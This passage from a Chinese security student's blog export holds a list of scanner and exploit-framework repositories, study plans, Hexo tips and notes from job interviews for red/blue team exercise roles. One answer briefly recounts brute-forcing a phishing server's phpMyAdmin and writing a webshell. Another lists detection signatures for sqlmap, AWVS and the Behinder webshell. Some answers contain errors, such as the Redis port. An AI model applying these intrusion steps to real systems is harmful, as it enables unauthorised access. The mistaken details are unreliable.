href="https://github.com/1N3/Sn1per">https://github.com/1N3/Sn1per</a><br>(自动化扫描器，包括中间件扫描以及设备指纹识别)<br><a href="https://github.com/RASSec/pentestEr_Fully-automatic-scanner">https://github.com/RASSec/pentestEr_Fully-automatic-scanner</a><br>(定向全自动化渗透测试工具)<br><a href="https://github.com/3xp10it/3xp10it">https://github.com/3xp10it/3xp10it</a><br>(自动化渗透测试框架，支持cdn真实ip查找，指纹识别等)<br><a href="https://github.com/Lcys/lcyscan">https://github.com/Lcys/lcyscan</a><br>(蟒插件化漏洞扫描器，支持生成扫描报表)<br><a href="https://github.com/Xyntax/POC-T">https://github.com/Xyntax/POC-T</a><br>(渗透测试插件化并发框架)<br><a href="https://github.com/v3n0m-Scanner/V3n0M-Scanner">https://github.com/v3n0m-Scanner/V3n0M-Scanner</a><br>(支持检测SQLI/ XSS / LFI / RFI等漏洞的扫描器)<br><a href="https://github.com/Skycrab/leakScan">https://github.com/Skycrab/leakScan</a><br>(Web图形化的漏洞扫描框架)<br><a href="https://github.com/zhangzhenfeng/AnyScan">https://github.com/zhangzhenfeng/AnyScan</a><br>(一款网络化的自动化渗透测试框架)<br><a href="https://github.com/Tuhinshubhra/RED_HAWK">https://github.com/Tuhinshubhra/RED_HAWK</a><br>(一款集成信息收集，漏洞扫描，指纹识别等的多合一扫描工具)<br><a href="https://github.com/Arachni/arachni">https://github.com/Arachni/arachni</a><br>(高度集成化的Web应用漏洞扫描框架，支持REST，RPC等api调用)<br><a href="https://github.com/infobyte/faraday">https://github.com/infobyte/faraday</a><br>(集成化渗透测试辅助平台及漏洞管理平台)<br><a href="https://github.com/juansacco/exploitpack">https://github.com/juansacco/exploitpack</a><br>(渗透测试集成框架，包含超过38,000+攻击)<br><a href="https://github.com/swisskyrepo/DamnWebScanner">https://github.com/swisskyrepo/DamnWebScanner</a><br>(基于铬/歌剧插件的被动式漏洞扫描)<br><a href="https://github.com/anilbaranyelken/tulpar">https://github.com/anilbaranyelken/tulpar</a><br>(支持多种网络漏洞扫描，命令行环境使用)<br><a href="https://github.com/m4ll0k/Spaghetti">https://github.com/m4ll0k/Spaghetti</a><br>(web应用扫描器，支持指纹识别，文件目录爆破，SQL / XSS / RFI等漏洞扫描，也可直接用于struts，ShellShock等扫描)<br><a href="https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest">https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest</a><br>(集成子域名枚举，nmap，waf指纹识别等模块的web应用扫描器)<br><a href="https://github.com/0xsauby/yasuo">https://github.com/0xsauby/yasuo</a><br>(使用ruby开发的扫描网络中主机存在的第三方web应用服务漏洞)<br><a href="https://github.com/hatRiot/clusterd">https://github.com/hatRiot/clusterd</a><br>(Web应用自动化扫描框架，支持自动化上传webshell)<br><a href="https://github.com/erevus-cn/pocscan">https://github.com/erevus-cn/pocscan</a><br>(一款开源Poc调用框架，可轻松调用Pocsuite，Tangscan，Beebeeto，Knowsec老版本POC，可使用docker部署)<br><a href="https://github.com/TophantTechnology/osprey">https://github.com/TophantTechnology/osprey</a><br>(斗象能力中心出品并长期维护的开源漏洞检测框架)<br><a href="https://github.com/yangbh/Hammer">https://github.com/yangbh/Hammer</a><br>(Web应用漏洞扫描框架)<br><a href="https://github.com/Lucifer1993/AngelSword">https://github.com/Lucifer1993/AngelSword</a><br>(Web应用漏洞扫描框架，基于python3)<br><a href="https://github.com/secrary/EllaScanner">https://github.com/secrary/EllaScanner</a><br>(被动式漏洞扫描，支持历史cve编号漏洞识别)<br><a href="https://github.com/zaproxy/zaproxy">https://github.com/zaproxy/zaproxy</a><br>(OWASP ZAP核心项目出品的综合性渗透测试工具)<br><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a><br>(Web服务综合型扫描器，用于指定目标的资产收集，安全配置缺陷或者安全漏洞扫描)<br><a href="https://github.com/s0md3v/Striker">https://github.com/s0md3v/Striker</a><br>(一款多方位信息收集，指纹识别及漏洞扫描工具)<br><a href="https://github.com/dermotblair/webvulscan">https://github.com/dermotblair/webvulscan</a><br>(一款web应用漏洞扫描器，支持扫描反射型以及存储型xss，sql injection等漏洞，支持输出pdf报告)<br><a href="https://github.com/alienwithin/OWASP-mth3l3m3nt-framework">https://github.com/alienwithin/OWASP-mth3l3m3nt-framework</a><br>(渗透测试辅助工具，综合利用框架)<br><a href="https://github.com/toyakula/luna">https://github.com/toyakula/luna</a><br>(基于被动式扫描框架的自动化web漏洞扫描工具)<br><a href="https://github.com/Manisso/fsociety">https://github.com/Manisso/fsociety</a><br>(渗透测试辅助框架，包含信息搜集，无线渗透，网络应用扫描等功能)<br><a href="https://github.com/boy-hack/w9scan">https://github.com/boy-hack/w9scan</a><br>(内置1200+插件的web漏洞扫描框架)<br><a href="https://github.com/YalcinYolalan/WSSAT">https://github.com/YalcinYolalan/WSSAT</a><br>(Web服务安全评估工具，提供基于windows操作系统的简单.exe应用)<br><a href="https://github.com/AmyangXYZ/AssassinGo">https://github.com/AmyangXYZ/AssassinGo</a><br>(使用去开发的可扩展以及高并发渗透测试框架)<br><a href="https://github.com/jeffzh3ng/InsectsAwake">https://github.com/jeffzh3ng/InsectsAwake</a><br>(基于Flask应用框架的漏洞扫描系统)<br><a href="https://github.com/m4ll0k/Galileo">https://github.com/m4ll0k/Galileo</a><br>(一个操作上类似metasploit的web应用安全审计框架)<br><a href="https://github.com/joker25000/Optiva-Framework">https://github.com/joker25000/Optiva-Framework</a><br>(一款web应用漏洞扫描器，支持扫描反射型以及存储型xss，sql injection等漏洞)<br><a href="https://github.com/theInfectedDrake/TIDoS-Framework">https://github.com/theInfectedDrake/TIDoS-Framework</a><br>(集成104个模块的Web应用程序渗透测试框架)<br><a href="https://github.com/Neo23x0/Loki">https://github.com/Neo23x0/Loki</a><br>(一款APT入侵痕迹扫描器)<br><a href="https://github.com/w3h/icsmaster/tree/master/nse">https://github.com/w3h/icsmaster/tree/master/nse</a><br>(ICS设备nmap扫描脚本)<br><a href="https://github.com/OpenNetworkingFoundation/DELTA">https://github.com/OpenNetworkingFoundation/DELTA</a><br>(SDN安全评估框架)</p>
]]></content>
      <categories>
        <category>工具手册</category>
      </categories>
      <tags>
        <tag>工具手册</tag>
      </tags>
  </entry>
  <entry>
    <title>个人规划</title>
    <url>/posts/d7c4f825/</url>
    <content><![CDATA[<p>最近一直在考研和就业上有所犹豫，这两天回家呆了几天，仔细想了想，最终还是决定选择就业，不去考研了。在这半年中，要好好准备，等暑假或者开学后去外面实习。在这期间，要好好学习以下一些知识。之前hvv面试了四次，面试前也没再接触这些兑现，再学习高数英语啥的，现在做好决定了，那就认真准备吧~</p>
<p>博客也会即使更新，希望每天都可以学到写东西吧。</p>
<br>

<ul>
<li>基础漏洞原理及利用</li>
</ul>
<ol>
<li>xss</li>
<li>sql注入</li>
<li>ssrf</li>
<li>csrf</li>
<li>XXE</li>
<li>反序列化</li>
<li>文件上传</li>
<li>逻辑漏洞</li>
<li>… （有待补充）</li>
</ol>
<ul>
<li>工具使用</li>
</ul>
<ol>
<li>burp suite 及插件</li>
<li>sqlmap</li>
<li>nmap</li>
<li>msf</li>
<li>xray</li>
<li>fuzzscan</li>
<li>Goby </li>
<li>…. （有待补充）</li>
</ol>
<ul>
<li>脚本编写</li>
</ul>
<ol>
<li>批量payload</li>
<li>scan</li>
</ol>
<ul>
<li>漏洞复现</li>
</ul>
<ol>
<li>vulhub</li>
<li>dwva</li>
<li>sqli</li>
<li>zkaq</li>
<li>…   (有待补充)</li>
</ol>
<ul>
<li>网络协议</li>
</ul>
<ol>
<li>TCP/IP</li>
<li>UDP</li>
<li>三次握手</li>
<li>…   （有待补充）</li>
</ol>
<ul>
<li>内网安全</li>
<li>APP渗透</li>
</ul>
]]></content>
      <categories>
        <category>规划</category>
      </categories>
      <tags>
        <tag>规划</tag>
      </tags>
  </entry>
  <entry>
    <title>信息收集</title>
    <url>/posts/312e3d12/</url>
    <content><![CDATA[<h2 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h2><h3 id="web接口查询"><a href="#web接口查询" class="headerlink" title="web接口查询:"></a>web接口查询:</h3><p><code>https://whois.aliyun.com/</code><br><code>https://www.whois365.com/cn/</code><br><code>http://whois.chinaz.com/</code><br><code>https://whois.aizhan.com/</code></p>
<h3 id="whois命令查询"><a href="#whois命令查询" class="headerlink" title="whois命令查询"></a>whois命令查询</h3><p>kali中自带whois查询工具  <code>whois 域名</code>进行查询</p>
<h2 id="子域名信息收集"><a href="#子域名信息收集" class="headerlink" title="子域名信息收集"></a>子域名信息收集</h2><h3 id="子域名收集工具"><a href="#子域名收集工具" class="headerlink" title="子域名收集工具"></a>子域名收集工具</h3><ol>
<li>layer子域名挖掘机</li>
<li>subDomainsBrute</li>
<li>Maltego CE</li>
<li>dnsenum</li>
</ol>
<br>

<h2 id="旁站-C段"><a href="#旁站-C段" class="headerlink" title="旁站/C段"></a>旁站/C段</h2><ul>
<li>旁站查询：<a href="https://whois.chinaz.com/">https://whois.chinaz.com/</a></li>
<li>在线工具：<a href="http://stool.chinaz.com/same">http://stool.chinaz.com/same</a></li>
<li>在线工具：<a href="https://www.webscan.cc/">https://www.webscan.cc/</a></li>
<li>CDN检测：<a href="https://www.17ce.com/">https://www.17ce.com/</a></li>
</ul>
<h2 id="CMS指纹识别"><a href="#CMS指纹识别" class="headerlink" title="CMS指纹识别"></a>CMS指纹识别</h2><ul>
<li><p>在线指纹识别：<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p>
</li>
<li><p>潮汐指纹：<a href="http://finger.tidesec.com/">http://finger.tidesec.com/</a></p>
</li>
</ul>
<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><ul>
<li>御剑</li>
<li>dirsearch</li>
<li>DirBuster</li>
</ul>
<br>

<h2 id="端口信息"><a href="#端口信息" class="headerlink" title="端口信息"></a>端口信息</h2><h3 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h3><ul>
<li>nmap</li>
<li>masscan</li>
<li>使用在线网站探测 <a href="http://tool.chinaz.com/port/">http://tool.chinaz.com/port/</a></li>
</ul>
<h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><ul>
<li>关闭不必要的端口</li>
<li>对重要业务的服务端口设置防火墙</li>
<li>经常性更改用户密码</li>
</ul>
<br>

<h2 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h2><ul>
<li>fofa: <a href="https://fofa.so/">https://fofa.so/</a></li>
<li>钟馗之眼：<a href="http://www.zoomeye.org/">http://www.zoomeye.org</a></li>
<li>Shodan：<a href="https://www.shodan.io/">https://www.shodan.io</a></li>
</ul>
<h2 id="GitHub敏感信息泄漏"><a href="#GitHub敏感信息泄漏" class="headerlink" title="GitHub敏感信息泄漏"></a>GitHub敏感信息泄漏</h2><p><a href="https://www.cnblogs.com/ichunqiu/p/10149471.html">https://www.cnblogs.com/ichunqiu/p/10149471.html</a></p>
]]></content>
      <categories>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo基本使用</title>
    <url>/posts/d4fee3ae/</url>
    <content><![CDATA[<p><code>hexo g </code> == <code>hexo generate </code> #生产静态网页<br><code>hexo s </code> == <code>hexo server</code> #启动服务预览<br><code>hexo d</code> == <code>hexo deploy</code> #部署<br><code>hexo clean</code> #清除缓存</p>
<h3 id="写文章"><a href="#写文章" class="headerlink" title="写文章"></a>写文章</h3><p><code>hexo new post “标题”</code>  新建一篇文章  然后会在_post目录下找到新增的.md文件，用此文件来存方所习得内容编写完markdown文件后，根目录下输入<code> hexo g</code>生产静态页面。输入<code>hexo s</code>本地预览效果，<code>hexo d</code>上传至GitHub</p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo文章模板设置</title>
    <url>/posts/2b14b1c3/</url>
    <content><![CDATA[<p>打开hexo项目文件夹张的scaffold中的<code>post.md</code>和<code>draft.md</code>,并修改<br>对应的是 <code>hexo new &lt;title&gt;</code> 默认是<code>post</code>，草稿是<code>draft</code></p>
<blockquote>
<hr>
<p>title: hexo文章模板设置<br>tags:<br>categories:<br>description:<br>date: 1616291706000</p>
<hr>
</blockquote>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>使用proxychains4gitclone拒绝访问</title>
    <url>/posts/3a6e39d4/</url>
    <content><![CDATA[<p>问题:Ubuntu使用proxychain4 git clone 报错 192.168.3.11 1080 拒绝访问<br>原因: 端口被占用了，之前在虚拟机Ubuntu的代理地方设置了代理，再用使用proxychain4，把在虚拟机中的代理设置取消掉就可以了</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>kali安装pip2</title>
    <url>/posts/6b338ac1/</url>
    <content><![CDATA[<p><code>kali 安装pip2</code><br><code>wget https://bootstrap.pypa.io/pip/2.6/get-pip.py</code><br><code>sudo python2 get-pip.py</code><br><code>pip2 -V</code><br>升级版本<br><code>sudo pip2 install --upgrade pip</code></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次hw面试经历(1)</title>
    <url>/posts/40769f33/</url>
    <content><![CDATA[<h1 id="一面"><a href="#一面" class="headerlink" title="一面:"></a>一面:</h1><h3 id="如何接触网络安全的"><a href="#如何接触网络安全的" class="headerlink" title="如何接触网络安全的"></a>如何接触网络安全的</h3><p>答：在大一时开始接触CTF，那时候开始正式接触安全，然后后面主要是学习的web安全，经常会看先知社区，freebuf，csdn和乌云<span id="more"></span>之类的社区文章学习</p>
<h3 id="有无接触过安全设备"><a href="#有无接触过安全设备" class="headerlink" title="有无接触过安全设备"></a>有无接触过安全设备</h3><p>答：没接触过。</p>
<h3 id="是否熟悉windows或者linux命令的使用"><a href="#是否熟悉windows或者linux命令的使用" class="headerlink" title="是否熟悉windows或者linux命令的使用"></a>是否熟悉windows或者linux命令的使用</h3><p>答：之前有学习过Linux，对于Linux和Windows的基本命令操作<!--more-->都可以熟悉使用。&lt; !–more–&gt;</p>
<h3 id="说一下如何进行信息收集"><a href="#说一下如何进行信息收集" class="headerlink" title="说一下如何进行信息收集"></a>说一下如何进行信息收集</h3><p>答：略</p>
<h3 id="sql注入写shell的条件"><a href="#sql注入写shell的条件" class="headerlink" title="sql注入写shell的条件"></a>sql注入写shell的条件</h3><p>答：<br>1.拥有root权限<br>2.知道网站绝对路径<br>3.开启PHP的全局gpc<br>4 在写入的目录下有写入权限</p>
<h3 id="xss的防御"><a href="#xss的防御" class="headerlink" title="xss的防御"></a>xss的防御</h3><p>答：1.进行实体编码<br>       2.对特殊字符进行过滤</p>
<h3 id="说一下ssrf的原理及利用"><a href="#说一下ssrf的原理及利用" class="headerlink" title="说一下ssrf的原理及利用"></a>说一下ssrf的原理及利用</h3><p>答：ssrf是一个攻击者构造形成从服务器端发起的安全漏洞，一般在服务器获取图片，文本之类的地方看到有引用其他文件的地方可以尝试一下是否有ssrf存在<br>利用：<br>1.可以用来对内网端口扫描<br>2.进行文件读取</p>
<h3 id="有没有接触过shiro漏洞"><a href="#有没有接触过shiro漏洞" class="headerlink" title="有没有接触过shiro漏洞"></a>有没有接触过shiro漏洞</h3><p>答：记着以前复现过shiro的反序列化，主要是在rememberme处，其解析为rememberme的cookie值– base64–aes解密–反序列化</p>
<h3 id="有没有溯源的经历"><a href="#有没有溯源的经历" class="headerlink" title="有没有溯源的经历"></a>有没有溯源的经历</h3><p>答：之前学校图书馆有过一次被入侵的经历，当时去看了一下，由于第一次接触就学了下相关内容</p>
<h3 id="说一下应急响应的基本流程"><a href="#说一下应急响应的基本流程" class="headerlink" title="说一下应急响应的基本流程"></a>说一下应急响应的基本流程</h3><p>答：对于Windows端的后门排除</p>
<h4 id="可以使用一些安全工具：d盾，logparser，autoruns，process-explorer等"><a href="#可以使用一些安全工具：d盾，logparser，autoruns，process-explorer等" class="headerlink" title="可以使用一些安全工具：d盾，logparser，autoruns，process explorer等"></a>可以使用一些安全工具：d盾，logparser，autoruns，process explorer等</h4><h4 id="项目检查"><a href="#项目检查" class="headerlink" title="项目检查"></a>项目检查</h4><p>注册表启动项<br>网络连接<br>恶意进程<br>系统服务<br>计划任务</p>
<h4 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h4><p>可以使用logparser格式化后进行分析<br>也可以使用Windows的事件查看器进行分析</p>
<h4 id="检查是否存在shift粘滞键后门"><a href="#检查是否存在shift粘滞键后门" class="headerlink" title="检查是否存在shift粘滞键后门"></a>检查是否存在shift粘滞键后门</h4><p>对于Linux端<br>1.查看异常账号        cat /etc/passwd<br>2.查看进程              ps -ef 丨more<br>3.查看网络连接       netstat -anplt<br>4.计划任务<br>5.系统启动项<br>6.系统日志</p>
<h4 id="对于web服务器"><a href="#对于web服务器" class="headerlink" title="对于web服务器"></a>对于web服务器</h4><p>可以查看中间件配置和相关日志<br>当然也要考虑浏览器劫持问题<br>f12查看网络的加载</p>
<h3 id="有没有面试过其他公司的hw"><a href="#有没有面试过其他公司的hw" class="headerlink" title="有没有面试过其他公司的hw"></a>有没有面试过其他公司的hw</h3><p>答：没有</p>
<h3 id="期望的薪资是多少"><a href="#期望的薪资是多少" class="headerlink" title="期望的薪资是多少"></a>期望的薪资是多少</h3><p><em>面试难度：易<br>面试结果：通过</em></p>
<h1 id="二面"><a href="#二面" class="headerlink" title="二面:"></a>二面:</h1><h3 id="你好，我们是xxx，请问你是xxx吗，现在方便吗？"><a href="#你好，我们是xxx，请问你是xxx吗，现在方便吗？" class="headerlink" title="你好，我们是xxx，请问你是xxx吗，现在方便吗？"></a>你好，我们是xxx，请问你是xxx吗，现在方便吗？</h3><p>答：您好，是的，现在方便，您讲。</p>
<h3 id="你先说一下什么是护网，护网的背景"><a href="#你先说一下什么是护网，护网的背景" class="headerlink" title="你先说一下什么是护网，护网的背景"></a>你先说一下什么是护网，护网的背景</h3><p>答：略</p>
<h3 id="说一下hw防守方流程"><a href="#说一下hw防守方流程" class="headerlink" title="说一下hw防守方流程"></a>说一下hw防守方流程</h3><p>答：前期需要对资产进行梳理，排查暴露面和敏感信息，中期要7*24h值守，及时写日报和周报，后期就需要总结和整改</p>
<h3 id="你说一下struct2-特征"><a href="#你说一下struct2-特征" class="headerlink" title="你说一下struct2 特征"></a>你说一下struct2 特征</h3><p>答：没怎么了解过，只知道有rce漏洞（.action .do）</p>
<h3 id="看你简历上有过图书馆溯源经历，你简单说一下溯源经历"><a href="#看你简历上有过图书馆溯源经历，你简单说一下溯源经历" class="headerlink" title="看你简历上有过图书馆溯源经历，你简单说一下溯源经历"></a>看你简历上有过图书馆溯源经历，你简单说一下溯源经历</h3><p>答：去年我们学校图书馆又被入侵过，老师让我们过去看一下，因为当时是第一次接触，就学习一下</p>
<h3 id="使用事件查看器查看一下是否存在异常事件"><a href="#使用事件查看器查看一下是否存在异常事件" class="headerlink" title="使用事件查看器查看一下是否存在异常事件"></a>使用事件查看器查看一下是否存在异常事件</h3><h3 id="那你说一下异常事件有哪些？"><a href="#那你说一下异常事件有哪些？" class="headerlink" title="那你说一下异常事件有哪些？"></a>那你说一下异常事件有哪些？</h3><p>答：这个不是很了解</p>
<h3 id="那你继续说"><a href="#那你继续说" class="headerlink" title="那你继续说"></a>那你继续说</h3><p>答：可以查看一下开放的端口，并关闭一些不必要的</p>
<h3 id="那你用什么查看呢"><a href="#那你用什么查看呢" class="headerlink" title="那你用什么查看呢"></a>那你用什么查看呢</h3><p>答：netstat -anlpt</p>
<h3 id="那你都关闭了那些端口呢"><a href="#那你都关闭了那些端口呢" class="headerlink" title="那你都关闭了那些端口呢"></a>那你都关闭了那些端口呢</h3><p>答：这个好像不太记得了，好像关闭了3389之类的，还关闭了一个数据库的应该是，记不清楚了，因为这个图书馆管理系统是老师自己用phpstudy搭建的。当时还查看了一下系统账号发现有几个被人添加过的账号，也存在隐藏用户</p>
<h3 id="那你说一下是怎么发现隐藏账户的呢"><a href="#那你说一下是怎么发现隐藏账户的呢" class="headerlink" title="那你说一下是怎么发现隐藏账户的呢"></a>那你说一下是怎么发现隐藏账户的呢</h3><p>答：我记着在注册表的“sam”（当时记不起来具体叫什么了）然后去找是否存在隐藏账号</p>
<h3 id="那隐藏账户有什么特征呢？"><a href="#那隐藏账户有什么特征呢？" class="headerlink" title="那隐藏账户有什么特征呢？"></a>那隐藏账户有什么特征呢？</h3><p>答：隐藏账户都会有~（当时忘记了是$，然后hr也有点疑问，但就是没想起来，隐藏用户用$符，当时回答时错说成了~隐藏用户<br>查看注册表 sam下 domains account users查看users表项中与names表项中项数量是否一致如果一致就没有隐藏用户如果不一致，就对照其他电脑用户注册表，即可找出其他隐藏用户事件查看器，查看异常事件）</p>
<h3 id="那你是怎么去查看日志的呢？"><a href="#那你是怎么去查看日志的呢？" class="headerlink" title="那你是怎么去查看日志的呢？"></a>那你是怎么去查看日志的呢？</h3><p>答：那个系统是好像一个window2008，使用的是Apache，一般Apache的日志好像是httpd</p>
<h3 id="是httpd吗？"><a href="#是httpd吗？" class="headerlink" title="是httpd吗？"></a>是httpd吗？</h3><p>答：这个我有些忘记了，不好意思（当时没想出来，logs/access.log和log/error.log）</p>
<h3 id="hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。"><a href="#hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。" class="headerlink" title="hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。"></a>hr：行，你的情况我大体了解了，当时候会给个整体反馈，再见。</h3><p>答：好的，麻烦您了，再见~</p>
<p><em>面试来的挺突然的，当时刚要去出去吃晚饭，总共聊了10分钟，感觉回答的不是很好，最后凉了😭</em></p>
]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次hw面试经历(2)</title>
    <url>/posts/e9000575/</url>
    <content><![CDATA[<h3 id="现在是不是上大学，4月份是否有时间，"><a href="#现在是不是上大学，4月份是否有时间，" class="headerlink" title="现在是不是上大学，4月份是否有时间，"></a>现在是不是上大学，4月份是否有时间，</h3><p>答: 现在大三在读，4月份有时间可以出来</p>
<h3 id="介绍下简历里的经历"><a href="#介绍下简历里的经历" class="headerlink" title="介绍下简历里的经历"></a>介绍下简历里的经历</h3><p>答: 钓鱼的服务器之前在qq群里看到过，进行信息搜集扫到phpmyadmin 然后爆破<span id="more"></span>之后开启写入日志的设置 写入webshell<br>然后就说了下那次图书馆的一次不完整的溯源经历，时间有些久了记得不是很清楚，而且那时候第一次接触这个，主要有两个现象，一是正常登陆时会被注销，二是mysql无法正常启动。<br>由于系统是window2008 且使用的phpstudy自行搭建的 之前有过被入侵的记录，也存在着一些被非法添加的账号，然后就在注册表中删除了一系列的账户，<br>在msconfig中开启了mysql服务，但是还是无法正常登陆。<br>netstat -ano看了下开启的端口，发现开启了80 Apache 808 iis 135端口。<br>查看事件查看器去看一些异常<br>id<br>4624 账号登陆成功<br>4625 账号登陆失败<br>4720 创建账号<br>4726 删除账号</p>
<h3 id="有没有过相关的护网经验"><a href="#有没有过相关的护网经验" class="headerlink" title="有没有过相关的护网经验"></a>有没有过相关的护网经验</h3><p>答: 没有过hw经验，但是我会去学习去了解</p>
<h3 id="是否有使用过安全产品"><a href="#是否有使用过安全产品" class="headerlink" title="是否有使用过安全产品"></a>是否有使用过安全产品</h3><p>答: 只接触过D盾，别的设备没接触过</p>
<h3 id="说一下常见的端口和漏洞"><a href="#说一下常见的端口和漏洞" class="headerlink" title="说一下常见的端口和漏洞"></a>说一下常见的端口和漏洞</h3><p>答:<br>1433 mssql<br>1521 orcale<br>3306 mysql<br>4376 Redis未授权访<br>7001 weblogic 反序列化<br>445 永恒之蓝</p>
<h3 id="说一下常用的安全工具的流量特征"><a href="#说一下常用的安全工具的流量特征" class="headerlink" title="说一下常用的安全工具的流量特征"></a>说一下常用的安全工具的流量特征</h3><p>答:<br>awvs的在header url body 三项中都会有a%#-wvs<br>sqlmap的 会在ua显示sqlmap级版本号 和 sqlmap网址<br>appscan url header和bkdy中都会有appscan<br>然后说了下菜刀大多使用base64编码，eval和assert会被隔开</p>
<h3 id="说一下冰蝎的流量特征"><a href="#说一下冰蝎的流量特征" class="headerlink" title="说一下冰蝎的流量特征"></a>说一下冰蝎的流量特征</h3><p>答: 这个有点不记得了<br>注:(冰蝎<br>1.content-type一定为application/octet-stream<br>2.内置17个UA Mozilla4/5<br>3.payload定长且无随机填充部分(padding)<br>)</p>
]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo阅读全文设置</title>
    <url>/posts/5605128/</url>
    <content><![CDATA[<p>使用<code>&lt; !--more--&gt;</code>标签手动截断 或者<br>文件夹下的scaffolds文件夹中的post.md中添加一行<code>description:&quot; &quot;</code> 即可在输入<code>hexo new post </code>博客标题命令新建.md文件时自动加上<code>description:&#39; &#39;</code> 在页面上显示阅读全文按钮且不带摘要。</p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
</search>
